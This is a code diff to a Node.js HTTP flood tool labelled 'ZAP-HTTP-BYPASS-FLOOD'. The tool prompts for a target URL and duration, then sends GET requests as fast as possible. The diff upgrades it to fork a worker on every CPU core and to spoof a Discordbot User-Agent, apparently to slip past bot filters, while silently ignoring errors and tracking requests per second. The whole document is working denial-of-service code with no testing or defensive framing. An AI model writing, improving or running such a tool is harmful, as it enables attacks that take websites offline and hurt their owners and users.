@@ -1,5 +1,7 @@
+const cluster = require('cluster');
 const http = require('http');
 const https = require('https');
+const os = require('os');
 const { URL } = require('url');
 const readline = require('readline');
 
@@ -12,66 +14,74 @@ const prompt = (q) => new Promise(res => rl.question(q, res));
 const clear = () => process.stdout.write('\x1Bc');
 
 let total = 0;
-let last = 0;
 let maxRPS = 0;
+let last = 0;
 
-async function start() {
+async function main() {
     clear();
     console.log("jrl@zap.live >");
 
-    const rawTarget = await prompt("[¿T] > ");
+    const targetInput = await prompt("[¿T] > ");
     const duration = parseInt(await prompt("[¿DU!] > ")) || 60;
 
-    const url = new URL(rawTarget.startsWith('http') ? rawTarget : `http://${rawTarget}`);
-    const end = Date.now() + duration * 1000;
-    const client = url.protocol === 'https:' ? https : http;
+    const target = new URL(targetInput.startsWith('http') ? targetInput : `http://${targetInput}`);
+    const protocol = target.protocol === 'https:' ? https : http;
+    const port = target.port || (target.protocol === 'https:' ? 443 : 80);
+    const cores = os.cpus().length;
 
     clear();
+    console.log(`Launching with ${cores} threads`);
 
-    setInterval(() => {
-        const rps = total - last;
-        maxRPS = Math.max(maxRPS, rps);
-        last = total;
+    if (cluster.isMaster) {
+        for (let i = 0; i < cores; i++) cluster.fork();
 
-        clear();
-        console.log("ZAP-HTTP-REAL-FLOOD");
-        console.log(`Requests:     ${total}`);
-        console.log(`Reqs/sec:     ${rps}`);
-        console.log(`Max Req/sec:  ${maxRPS}`);
-    }, Math.floor(Math.random() * 2000) + 3000);
+        setInterval(() => {
+            const rps = total - last;
+            last = total;
+            maxRPS = Math.max(maxRPS, rps);
+            clear();
+            console.log("ZAP-HTTP-BYPASS-FLOOD");
+            console.log(`Total Sent:   ${total}`);
+            console.log(`RPS:          ${rps}`);
+            console.log(`Max RPS:      ${maxRPS}`);
+        }, 4000);
 
-    function blast() {
-        if (Date.now() > end) return stop();
+        setTimeout(() => {
+            for (const id in cluster.workers) cluster.workers[id].kill();
+            clear();
+            console.log("ZAP-FLOOD DONE");
+            console.log(`Final Sent: ${total}`);
+            console.log(`Max RPS:    ${maxRPS}`);
+            process.exit(0);
+        }, duration * 1000);
 
-        const options = {
-            hostname: url.hostname,
-            port: url.port || (url.protocol === 'https:' ? 443 : 80),
-            path: url.pathname || "/",
-            method: "GET",
-            headers: {
-                'User-Agent': 'Mozilla/5.0',
-                'Accept': '*/*',
-                'Connection': 'close',
-            }
-        };
+        cluster.on('message', (_, msg) => {
+            if (msg === 'inc') total++;
+        });
 
-        const req = client.request(options);
-        req.on('error', () => {}); // swallow fails
-        req.end();
+    } else {
+        function blast() {
+            const options = {
+                hostname: target.hostname,
+                port: port,
+                path: target.pathname,
+                method: 'GET',
+                headers: {
+                    'User-Agent': 'Discordbot/2.0 (+https://discordapp.com)',
+                    'Accept': 'text/html',
+                    'Connection': 'close'
+                }
+            };
 
-        total++;
-        setImmediate(blast);
+            const req = protocol.request(options);
+            req.on('error', () => {});
+            req.end();
+
+            process.send('inc');
+            setImmediate(blast);
+        }
+        blast();
     }
-
-    blast();
 }
 
-function stop() {
-    clear();
-    console.log("ZAP-HTTP-REAL-FLOOD DONE");
-    console.log(`Requests:     ${total}`);
-    console.log(`Max Req/sec:  ${maxRPS}`);
-    process.exit(0);
-}
-
-start();
+main();
